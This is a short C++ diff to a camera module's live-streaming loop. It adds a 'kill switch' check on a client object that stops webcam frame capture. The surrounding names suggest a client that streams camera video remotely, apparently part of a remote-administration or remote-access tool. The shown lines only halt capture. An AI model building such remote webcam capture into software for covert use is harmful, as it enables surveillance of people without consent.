@@ -599,6 +599,14 @@ void mod_Camera::LiveCam(int pIndexDev) {
         int iHeaderSize = strHeader.size();
 
         while (this->vcCamObjs[pIndexDev].isLive) {
+            //Kill swith
+            if (cCliente->isKillSwitch()) {
+                __DBG_("[CAM] kill_switch...");
+                cCliente->setKillSwitch(false);
+                this->vcCamObjs[pIndexDev].isLive = false;
+                break;
+            }
+
             u_int uiPacketSize = 0;
             std::vector<BYTE> cBuffer = this->GetFrame(pIndexDev);
             
